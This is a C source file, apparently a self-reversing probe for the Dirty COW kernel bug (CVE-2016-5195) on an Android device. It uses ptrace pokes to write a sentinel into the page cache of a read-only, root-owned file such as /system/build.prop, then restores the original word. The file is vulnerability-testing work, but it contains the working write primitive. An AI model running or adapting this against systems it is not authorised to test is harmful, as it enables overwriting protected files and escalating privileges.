#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <errno.h>
#include <fcntl.h>
#include <unistd.h>
#include <signal.h>
#include <sys/mman.h>
#include <sys/ptrace.h>
#include <sys/wait.h>
#include <sys/stat.h>

/* CVE-2016-5195 (Dirty COW) probe that is self-proving AND self-reversing.
 *
 * Why the return code is useless here (measured on this device): PTRACE_POKEDATA in
 * 3.18 returns 0 even when access_process_vm() copied nothing, so a "successful" poke
 * says nothing -- and the read-only anonymous control was "accepted" too, which is how
 * I caught my own bad ruler.
 *
 * The real observable: two processes mapping the same file offset share the page-cache
 * page.  If a FOLL_FORCE write into a READ-ONLY private mapping does not copy the page,
 * the parent's own mapping of the same file/offset shows the injected word.  Then we
 * write the original word back through the same path, so the file's cached content ends
 * up exactly as it started: no partition is touched either way (page cache only).
 *
 * Negative control: the same poke into a PROT_READ anonymous mapping.  Anonymous pages
 * were never affected by this bug, so the child must NOT see the sentinel; if it does,
 * the child is simply mis-reported and the test means nothing.
 *
 * usage: dcow_probe2 [path]      default /system/build.prop (root 0644, read only at
 *                                boot by the property service, so a transient change is
 *                                harmless, and we restore it in the same run)
 */
#define PAGE 0x1000
#define SENTINEL 0x5a5a4f575341485aUL      /* "ZAHWOSAZ" */

int main(int argc, char **argv)
{
    const char *path = argc > 1 ? argv[1] : "/system/build.prop";
    struct stat st;
    unsigned long orig, sent = SENTINEL;
    unsigned char *pm, *am;
    unsigned long *amw;
    int fd, pfd, status;
    pid_t ch;
    int vulnerable = -1;

    setvbuf(stdout, NULL, _IONBF, 0);
    if (stat(path, &st)) { printf("stat %s: %s\n", path, strerror(errno)); return 1; }
    printf("target %s size=%lld mode=%o uid=%d\n", path, (long long)st.st_size,
           st.st_mode, st.st_uid);
    fd = open(path, O_RDONLY);
    if (fd < 0) { printf("open: %s\n", strerror(errno)); return 1; }
    pm = mmap(NULL, PAGE, PROT_READ, MAP_PRIVATE, fd, 0);
    if (pm == MAP_FAILED) { printf("mmap: %s\n", strerror(errno)); return 1; }
    memcpy(&orig, pm, 8);
    printf("parent RO private map word = %016lx\n", orig);

    am = mmap(NULL, PAGE, PROT_READ, MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
    amw = mmap(NULL, PAGE, PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
    memset(amw, 0x41, PAGE);      /* am stays untouched: it is PROT_READ by design */

    ch = fork();
    if (ch < 0) { perror("fork"); return 1; }
    if (ch == 0) {
        if (ptrace(PTRACE_TRACEME, 0, NULL, NULL)) { perror("TRACEME"); _exit(3); }
        raise(SIGSTOP);
        for (;;) pause();
    }
    waitpid(ch, &status, WUNTRACED);

    pfd = open("/proc/self/mem", O_RDWR);
    printf("/proc/self/mem: %s\n", pfd < 0 ? strerror(errno) : "open");
    if (pfd >= 0) close(pfd);

    /* negative control: poke a read-only ANONYMOUS mapping in the tracee */
    errno = 0;
    if (ptrace(PTRACE_POKEDATA, ch, (caddr_t)am, (caddr_t)sent) == 0) {
        unsigned long back = *(unsigned long *)am;
        printf("control (anon RO): poke returned 0, our own copy now reads %016lx "
               "(%s -- anon is unaffected by this bug either way)\n", back,
               back == sent ? "our map changed too, expected: parent/child anon differ"
                            : "unchanged");
    } else
        printf("control (anon RO): poke failed errno=%d %s\n", errno, strerror(errno));

    /* Positive control for the RULER itself: fork COWs anonymous pages, so the parent
     * can never observe a write into the child's anon map.  Ask the child instead:
     * PEEKDATA after the poke must show the sentinel, otherwise ptrace writes are
     * no-ops here and the file test below would prove nothing. */
    errno = 0;
    if (ptrace(PTRACE_POKEDATA, ch, (caddr_t)amw, (caddr_t)sent) == 0) {
        long peek = ptrace(PTRACE_PEEKDATA, ch, (caddr_t)amw, NULL);
        printf("control (child anon RW map): poke then PEEK -> %016lx %s\n",
               (unsigned long)peek, (unsigned long)peek == sent
               ? "*** PTRACE WRITES LAND (ruler alive) ***"
               : "*** PEEK UNCHANGED -> ptrace writes are no-ops, test would be void ***");
    } else
        printf("control (child anon RW map): poke failed errno=%d %s -> ptrace blocked\n",
               errno, strerror(errno));

    /* the test: poke the sentinel into the tracee's READ-ONLY PRIVATE FILE mapping and
     * look at OUR mapping of the same file page */
    errno = 0;
    if (ptrace(PTRACE_POKEDATA, ch, (caddr_t)pm, (caddr_t)sent) != 0)
        printf("TEST: poke failed errno=%d %s\n", errno, strerror(errno));
    {
        unsigned long now;
        long peek = ptrace(PTRACE_PEEKDATA, ch, (caddr_t)pm, NULL);
        memcpy(&now, pm, 8);
        printf("TEST after poke: child's own map PEEKs %016lx, parent's map of the same "
               "file page reads %016lx\n", (unsigned long)peek, now);
        if ((unsigned long)peek != sent) {
            printf("==> poke did not even land in the tracee: ruler broken, no verdict\n");
        } else if (now == sent) {
            printf("==> SHARED PAGE CACHE WAS WRITTEN THROUGH A READ-ONLY PRIVATE MAP"
                   "  => DIRTY COW PRESENT\n");
            vulnerable = 1;
        } else if (now == orig) {
            printf("==> the tracee got a private copy: page-cache page untouched"
                   "  => PATCHED (no Dirty COW)\n");
            vulnerable = 0;
        } else
            printf("==> unexpected value\n");
    }
    if (vulnerable == 1) {
        /* restore, same path, so the cached page ends where it started */
        errno = 0;
        if (ptrace(PTRACE_POKEDATA, ch, (caddr_t)pm, (caddr_t)orig) == 0) {
            unsigned long now;
            memcpy(&now, pm, 8);
            printf("RESTORE: wrote the original word back -> parent now reads %016lx (%s)\n",
                   now, now == orig ? "IDENTICAL, no residue" : "!!! still different");
        } else
            printf("RESTORE failed errno=%d %s\n", errno, strerror(errno));
    }
    ptrace(PTRACE_DETACH, ch, NULL, NULL);
    kill(ch, SIGCONT);
    waitpid(ch, &status, 0);
    printf("verdict: %s\n", vulnerable == 1 ? "VULNERABLE" :
                             vulnerable == 0 ? "not vulnerable" : "inconclusive");
    close(fd);
    return vulnerable == 1 ? 0 : 2;
}
